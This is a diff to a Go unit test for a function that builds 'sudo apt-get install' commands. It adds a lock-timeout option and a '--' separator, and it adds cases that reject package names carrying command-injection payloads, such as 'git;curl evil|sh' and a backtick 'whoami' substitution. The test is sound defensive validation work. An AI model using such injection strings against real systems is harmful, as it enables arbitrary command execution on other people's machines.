@@ -126,23 +126,33 @@ func TestGetInstall(t *testing.T) {
 		{
 			name:     "single package",
 			packages: []string{"git"},
-			wantCmd:  "sudo -n apt-get install -y git",
+			wantCmd:  "sudo -n apt-get install -y -o DPkg::Lock::Timeout=60 -- git",
 		},
 		{
 			name:     "multiple packages",
 			packages: []string{"git", "curl", "tree"},
-			wantCmd:  "sudo -n apt-get install -y git curl tree",
+			wantCmd:  "sudo -n apt-get install -y -o DPkg::Lock::Timeout=60 -- git curl tree",
 		},
 		{
 			name:     "empty packages",
 			packages: []string{},
-			wantErr:  "at least one package is required",
+			wantErr:  "apt: install requires at least one package",
+		},
+		{
+			name:     "package with semicolon rejected",
+			packages: []string{"git;curl evil|sh"},
+			wantErr:  "contains disallowed characters",
+		},
+		{
+			name:     "package with backtick rejected",
+			packages: []string{"git", "tree`whoami`"},
+			wantErr:  "contains disallowed characters",
 		},
 		{
 			name:      "runner error wraps packages context",
 			packages:  []string{"nonexistent-pkg"},
 			runnerErr: errors.New("exit status 100"),
-			wantErr:   "apt-get install [nonexistent-pkg]",
+			wantErr:   `apt: install ["nonexistent-pkg"]`,
 		},
 	}
 	for _, tt := range tests {
